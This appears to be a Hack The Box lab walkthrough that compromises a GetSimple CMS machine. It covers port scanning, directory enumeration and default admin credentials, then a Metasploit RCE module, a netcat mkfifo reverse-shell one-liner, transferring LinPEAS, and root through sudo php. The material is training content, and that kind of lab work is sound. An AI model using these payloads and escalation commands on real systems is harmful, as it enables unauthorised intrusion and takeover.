# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Knowledgecheck]
└─$ rustscan -a ags.htb -- -A     

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```
# Enumeration
## HTTP (80)

### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Knowledgecheck]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u  http://ags.htb

/admin                (Status: 301) [Size: 302] [--> http://ags.htb/admin/]
/backups              (Status: 301) [Size: 304] [--> http://ags.htb/backups/]
/data                 (Status: 301) [Size: 301] [--> http://ags.htb/data/]
/plugins              (Status: 301) [Size: 304] [--> http://ags.htb/plugins/]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 272]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 302] [--> http://ags.htb/theme/]
```

`/admin` login page:

![Pasted image 20250913182333.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250913182333.png)

credentials are user:`admin` password:`admin`:

![Pasted image 20250913182542.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250913182542.png)
# Exploit
## Metasploit

We can use [Metasploit](../../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) to search for the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md):

```bash
msf > search GetSimple CMS 3.3.15 

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/getsimplecms_unauth_code_exec

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

We set `options` and run it:

```bash
msf exploit(multi/http/getsimplecms_unauth_code_exec) > options   

msf exploit(multi/http/getsimplecms_unauth_code_exec) > set rhosts ags.htb
rhosts => ags.htb
msf exploit(multi/http/getsimplecms_unauth_code_exec) > set lhost 10.10.15.157
lhost => 10.10.15.157
msf exploit(multi/http/getsimplecms_unauth_code_exec) > run
[*] Started reverse TCP handler on 10.10.15.157:4444 
[*] Sending stage (40004 bytes) to 10.129.42.249
[*] Meterpreter session 1 opened (10.10.15.157:4444 -> 10.129.42.249:41654) 

meterpreter > shell
```

Now we have a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) and we can read the user flag:

```bash
whoami
www-data
```

Now we can use [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md), we transfer the shell with [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) opening a listener then use [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/Scrivania]
└─$ nc -lvnp 1337
listening on [any] 1337 ...

$ ls

$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 1337 >/tmp/f
```

Using this [Payload](../../../3%20-%20Tags/Hacking%20Concepts/Payload.md) on meterpreter session:

```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 1337 >/tmp/f
```

```bash
$ export TERM=xterm                                  
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gettingstarted:/home$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                   
┌──(mdn0x㉿mdn0xKali)-[~/Scrivania]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
www-data@gettingstarted:/home$ 
```
# Privilege Escalation
## LinPEAS

We can transfer [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Knowledgecheck]
└─$ locate linpeas.sh
/usr/share/peass/linpeas/linpeas.sh                                                                                             
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Knowledgecheck]
└─$ cp /usr/share/peass/linpeas/linpeas.sh .

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Knowledgecheck]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Download and run it:

```bash
www-data@gettingstarted:/tmp$ wget http://10.10.xx.xxx/linpeas.sh
--2025-09-13 16:55:00--  http://10.10.15.157/linpeas.sh
Connecting to 10.10.xx.xxx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 131.02K   122KB/s    in 1.1s    

2025-09-13 16:55:03 (122 KB/s) - ‘linpeas.sh’ saved [134168/134168]

www-data@gettingstarted:/tmp$ chmod +x *.sh
www-data@gettingstarted:/tmp$ ./linpeas.sh 

[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands    
Matching Defaults entries for www-data on gettingstarted:                                               
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php


[+] Backup files?
-rw-r--r-- 1 www-data www-data 3944 Sep  7  2018 /var/www/html/admin/backups.php                                                                                                                                                             
-rw-r--r-- 1 www-data www-data 6018 Sep  7  2018 /var/www/html/admin/backup-edit.php
-rw-r--r-- 1 www-data www-data 678 Sep  7  2018 /var/www/html/admin/template/sidebar-backups.php
-rw-r--r-- 1 root root 2743 Feb  1  2021 /etc/apt/sources.list.curtin.old


+] Looking for root files in folders owned by me
-rwxr-xr-x 1 root root 221 Feb  9  2021 /var/www/html/data/users/admin.xml                                                                                                                                                                   
-rwxr-xr-x 1 root root 221 Feb  9  2021 /var/www/html/data/users/admin.xml
-rwxr-xr-x 1 root root 221 Feb  9  2021 /var/www/html/data/users/admin.xml

```

Read the file:

```
www-data@gettingstarted:/$ cat var/www/html/data/users/admin.xml    
<?xml version="1.0" encoding="UTF-8"?>
<item><USR>admin</USR><NAME/><PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD><EMAIL>admin@gettingstarted.com</EMAIL><HTMLEDITOR>1</HTMLEDITOR><TIMEZONE/><LANG>en_US</LANG></item>
```

This is actually the `admin` password used before to access on admin page.
## GTFObins

We can use `usr/bin/php` as root, let's search on [GTFObins](../../../3%20-%20Tags/Hacking%20Tools/GTFObins.md):

![Pasted image 20250913193228.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250913193228.png)

```bash
www-data@gettingstarted:/$ CMD="/bin/sh"
www-data@gettingstarted:/$ sudo php -r "system('$CMD');"

whoami
root
cat /root/root.txt
```

Pwned !!